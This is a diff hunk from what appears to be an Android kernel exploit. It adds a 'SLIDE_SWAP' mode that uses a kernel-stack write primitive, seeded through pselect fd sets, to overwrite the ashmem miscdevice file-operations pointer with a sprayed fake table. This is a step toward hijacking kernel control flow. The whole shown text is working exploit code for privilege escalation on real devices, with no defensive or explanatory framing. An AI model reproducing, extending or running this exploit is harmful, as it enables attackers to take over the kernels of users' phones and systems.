@@ -890,6 +890,29 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
             stack_deadline = 0;
             pr_info("stack mode4 SLIDE_ZERO: *%016llx = 0\n",
                     (unsigned long long)tree_l);
+          } else if (env_flag("MODE4_SLIDE_SWAP", 0)) {
+            /*
+             * THE SWAP: write fake_fops to P0(MISC.fops) using the
+             * PROVEN stack-stamp erase (SLIDE mechanism). Bypasses the
+             * heap W0.pi placement entirely — the write comes from the
+             * fdset stamp on the kernel stack. SLIDE_VERIFY confirmed
+             * the table is at fake_fops (owner=0 at +0x00).
+             */
+            tree_pc = (uint64_t)fake_fops;
+            tree_r = 0;
+            tree_l = (uint64_t)data_addr(KIMAGE_TEXT_BASE +
+                (active_offsets ? (uint64_t)active_offsets->off_ashmem_misc_fops
+                                : ASHMEM_MISC_FOPS_OFF));
+            pi_parent = 0;
+            pi_right = 0;
+            pi_left = 0;
+            stack_lock = fake_lock;
+            stack_prio = 3;
+            stack_deadline = 0;
+            pr_info("stack SLIDE_SWAP: *MISC.fops(%016llx) = fake_fops "
+                    "(%016llx)\n",
+                    (unsigned long long)tree_l,
+                    (unsigned long long)tree_pc);
           } else if (env_flag("MODE4_SLIDE_VERIFY", 0)) {
             /*
              * PLACEMENT VERIFIER: write fake_fops (sprayed page address)
